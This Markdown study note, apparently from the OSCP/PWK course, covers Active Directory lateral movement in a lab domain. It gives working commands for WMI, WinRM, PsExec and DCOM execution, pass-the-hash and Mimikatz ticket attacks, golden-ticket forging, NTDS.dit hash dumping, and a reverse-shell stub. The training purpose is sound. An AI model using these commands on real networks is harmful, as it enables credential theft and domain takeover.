---
title: "PWK Module 23 — Lateral Movement in Active Directory"
created: "2026-04-06"
type: reference-note
status: active
tags:
  - reference-note
  - active-directory
  - lateral-movement
  - pass-the-hash
  - kerberos
  - golden-ticket
  - mimikatz
  - oscp
source: "PWK Module 23 — Lateral Movement in Active Directory"
---

# PWK Module 23 — Lateral Movement in Active Directory

## Overview

Lateral movement is using access on one machine to gain access to another. This module covers eight techniques spanning NTLM-based, Kerberos-based, and protocol-based movement. The choice of technique depends on what credentials/hashes you have and what the target accepts.

**Lab context:** Domain `corp.com`, attacker starts as `jeff` on `CLIENT74`, lateral movement targets include `FILES04`, `WEB04`, `CLIENT76`, `DC1`.

---

## 1. WMI (Windows Management Instrumentation)

WMI's `Win32_Process.Create` method can spawn processes on remote hosts. Requires local admin credentials on the target.

### wmic (legacy, deprecated)

```cmd
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
# Return value 0 = success; output shows PID of new process
```

### PowerShell CIM (modern approach)

```powershell
# Build credential object
$username = 'jen'
$password = 'Nexus123!'
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential($username, $secureString)

# Create CIM session over DCOM
$options = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $options

# Execute process remotely
$command = 'calc'
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=$command}
```

### WMI Reverse Shell

Encode payload in base64 first (avoids special character escaping):

```python
# encode_shell.py
import base64
payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.208",443);...'
encoded = base64.b64encode(payload.encode('utf-16-le'))
print(encoded.decode())
```

```powershell
$command = 'powershell -nop -w hidden -e <BASE64_PAYLOAD>'
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=$command}
```

---

## 2. WinRM

WinRM (Windows Remote Management) is the Microsoft implementation of WS-Management. Requires target to have WinRM enabled and current user to be in the WinRM users group or local admins.

### winrs (command line)

```cmd
winrs -r:FILES04 -u:jen -p:Nexus123! "cmd /c hostname && whoami"

# Full reverse shell
winrs -r:FILES04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e <BASE64_PAYLOAD>"
```

### PowerShell Remoting (New-PSSession)

```powershell
$credential = New-Object System.Management.Automation.PSCredential('jen', (ConvertTo-SecureString 'Nexus123!' -AsPlaintext -Force))

$session = New-PSSession -ComputerName 192.168.50.73 -Credential $credential
Enter-PSSession $session          # interactive session
# hostname / whoami confirms remote execution
```

---

## 3. PsExec

PsExec (SysInternals) uploads a service binary to the target's ADMIN$ share, registers it as a Windows service, and runs it. Requires local admin on target.

```cmd
# From CLIENT74 targeting FILES04
.\PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
# Returns interactive cmd shell on FILES04 as jen
```

**Why it's noisy:** Creates a service (`PSEXESVC`) on the target — logged in Windows Event Log (Event ID 7045). Detection rate is high in monitored environments.

---

## 4. Pass the Hash (PtH)

Use an NTLM hash directly for authentication — no need to crack it. Works with protocols that support NTLM authentication (SMB, WMI, RDP in some configs).

**Requirement:** The hash must be for a local administrator account (or a domain account with local admin rights on the target).

### impacket-wmiexec (from Kali)

```bash
impacket-wmiexec -hashes :NTLM_HASH Administrator@192.168.50.73
# Format: -hashes LM_HASH:NTLM_HASH (LM can be empty — use : prefix)
# Gives interactive WMI shell as Administrator
```

### Other impacket tools for PtH

```bash
impacket-psexec -hashes :NTLM_HASH Administrator@TARGET_IP
impacket-smbexec -hashes :NTLM_HASH Administrator@TARGET_IP
crackmapexec smb TARGET_IP -u Administrator -H NTLM_HASH --local-auth
```

**Key caveat:** Pass-the-Hash does NOT work against accounts protected by Windows Defender Credential Guard. Also fails for RDP unless Restricted Admin Mode is enabled.

---

## 5. Overpass the Hash

Convert an NTLM hash into a Kerberos TGT. Useful when the target only accepts Kerberos (not NTLM) or when you want to avoid NTLM traffic on the wire.

### Step 1 — Have the NTLM Hash (Mimikatz)

```
privilege::debug
sekurlsa::logonpasswords
# Find target user (jen) → NTLM: <hash>
```

### Step 2 — Create New Process with Kerberos Auth

```
sekurlsa::pth /user:jen /domain:corp.com /ntlm:<NTLM_HASH> /run:powershell
# Opens a NEW PowerShell window running as jen
```

### Step 3 — Trigger Kerberos TGT Request

In the new PowerShell window (no tickets yet):

```powershell
klist                              # empty — no TGT yet
net use \\FILES04                  # triggers AS-REQ/AS-REP → TGT + CIFS TGS cached
klist                              # now shows TGT and TGS
```

### Step 4 — Use TGT with Kerberos-Only Tools

```cmd
.\PsExec.exe \\FILES04 cmd         # uses cached TGT for Kerberos auth — no password needed
```

**Critical detail:** Connect via **hostname** (`\\FILES04`), not IP. Using the IP address forces NTLM authentication and bypasses the TGT entirely.

---

## 6. Pass the Ticket

Export a Kerberos ticket from one session and inject it into another. No admin required if the ticket belongs to the current user.

### Export All Tickets (Mimikatz)

```
privilege::debug
sekurlsa::tickets /export
# Writes .kirbi files to current directory: [0;XXXXX]-2-0-40810000-dave@cifs-web04.kirbi
```

```powershell
dir *.kirbi     # list exported tickets; find dave's CIFS ticket for WEB04
```

### Inject Ticket into Current Session

```
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
klist           # verify dave's ticket is now in jen's session
```

### Use the Injected Ticket

```powershell
ls \\web04\backup    # access dave's restricted share — succeeds!
```

**When to use over Overpass the Hash:** Pass the Ticket requires no cracking or hash — just steal an existing ticket from memory. Useful when a privileged user is already logged in on a machine you have admin access to.

---

## 7. DCOM (Distributed Component Object Model)

DCOM allows remote instantiation of COM objects. The MMC Application Class (`MMC20.Application`) exposes an `ExecuteShellCommand` method usable for lateral movement. Requires local admin on the target.

```powershell
# Instantiate MMC on remote FILES04
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1", "192.168.50.73"))

# Execute a command (calc for test, reverse shell for real)
$dcom.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c calc", "7")

# Verify on target: tasklist | findstr "calc"
```

### DCOM Reverse Shell

```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("powershell", $null, "-nop -w hidden -e <BASE64_PAYLOAD>", "7")
```

**Why DCOM:** Uses legitimate Windows protocols; less likely to be blocked by application whitelisting than custom tools.

---

## 8. Golden Ticket

A Golden Ticket is a forged TGT signed with the `krbtgt` account's NTLM hash. Because ALL Kerberos tickets in the domain are validated against `krbtgt`, a forged TGT grants access to everything — indefinitely.

**Requirement:** The `krbtgt` NTLM hash — only obtainable if you've compromised a Domain Controller (via DCSync, LSASS dump on DC, or Shadow Copy).

### Step 1 — Get krbtgt Hash (on DC)

```
# On DC as DA (jeffadmin)
lsadump::lsa /patch
# or: lsadump::dcsync /user:krbtgt
# Output: krbtgt NTLM hash + domain SID
```

### Step 2 — Purge Existing Tickets

```
kerberos::purge
```

### Step 3 — Forge Golden Ticket

```
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /user:jen /krbtgt:<KRBTGT_NTLM_HASH>
```

| Flag | Value |
|------|-------|
| `/sid` | Domain SID (no trailing RID) |
| `/domain` | Domain FQDN |
| `/ptt` | Inject immediately into memory |
| `/user` | Must be an existing domain account (post-July 2022) |
| `/krbtgt` | NTLM hash of krbtgt account |

**Default groups injected:** Domain Admins (512), Schema Admins (518), Enterprise Admins (519), Group Policy Creator Owners (520), Domain Users (513) — effectively DA access.

### Step 4 — Open Shell and Use

```
misc::cmd                             # open new cmd in golden ticket context
.\PsExec.exe \\DC1 cmd               # lateral move to DC — succeeds!
whoami /groups                        # confirms Domain Admins membership
```

**Connect via hostname, not IP** — same rule as Overpass the Hash. IP forces NTLM.

**Key difference vs Silver Ticket:**
- Silver Ticket = forged TGS for ONE service (scoped)
- Golden Ticket = forged TGT granting access to ALL services domain-wide (domain-wide persistence)

---

## 9. Shadow Copies (NTDS.dit Extraction)

As DA on a DC, extract the Active Directory database file (`NTDS.dit`) offline using Volume Shadow Service. Contains NTLM hashes and Kerberos keys for every domain account.

### Step 1 — Create Shadow Copy (on DC)

```cmd
vshadow.exe -nw -p C:
# Note the shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

### Step 2 — Copy NTDS.dit from Shadow

```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit C:\ntds.dit.bak
```

### Step 3 — Save SYSTEM Hive (decryption key)

```cmd
reg save HKLM\SYSTEM C:\system.bak
```

### Step 4 — Extract Hashes Offline (on Kali)

```bash
# Transfer ntds.dit.bak and system.bak to Kali first
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
# Output: NTLM hashes + Kerberos keys for ALL domain users
```

**Why Shadow Copy:** Avoids touching LSASS on individual machines. Extracts credentials for every domain user in one shot. The `LOCAL` keyword tells secretsdump to parse files offline (no network connection to DC required).

---

## Lateral Movement Decision Tree

```
What do you have?
├── Plaintext credentials → WMI / WinRM / PsExec / winrs
├── NTLM hash (no plaintext)
│     ├── Target accepts NTLM → Pass the Hash (wmiexec -hashes)
│     └── Target prefers Kerberos → Overpass the Hash (sekurlsa::pth → TGT)
├── Existing Kerberos ticket in memory → Pass the Ticket (export + inject .kirbi)
├── krbtgt NTLM hash → Golden Ticket (domain-wide persistent access)
├── Service account NTLM hash → Silver Ticket (scoped to one service)
└── DA on DC → Shadow Copy NTDS.dit → dump ALL hashes offline
```

---

## Quick Reference — All Commands

```bash
# From Kali
impacket-wmiexec -hashes :NTLM_HASH Administrator@TARGET
impacket-psexec -hashes :NTLM_HASH Administrator@TARGET
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

```cmd
# WinRM
winrs -r:FILES04 -u:jen -p:Nexus123! "cmd /c hostname && whoami"

# PsExec
.\PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
```

```
# Mimikatz
kerberos::purge                                     # clear tickets
sekurlsa::pth /user:jen /domain:corp.com /ntlm:HASH /run:powershell
sekurlsa::tickets /export                           # dump all tickets to .kirbi
kerberos::ptt ticket.kirbi                          # inject ticket
kerberos::golden /sid:SID /domain:corp.com /ptt /user:jen /krbtgt:HASH
lsadump::lsa /patch                                 # dump all hashes from DC LSASS
misc::cmd                                           # new cmd in current ticket context
```

```cmd
# Shadow Copy (on DC)
vshadow.exe -nw -p C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit C:\ntds.dit.bak
reg save HKLM\SYSTEM C:\system.bak
```

---

## Connections

- [[PWK-Module-22-Attacking-AD-Authentication]] — obtaining hashes via DCSync/Mimikatz/Kerberoasting that feed into PtH and Golden Ticket
- [[AD-Lateral-Movement-Patterns]] — mental model for choosing the right lateral movement technique
- [[Pivoting-Mental-Model]] — combining tunneling with lateral movement for multi-hop scenarios
- [[PWK-Module-21-Active-Directory-Enumeration]] — BloodHound paths that identify where to move laterally

---

*From: PWK Module 23*
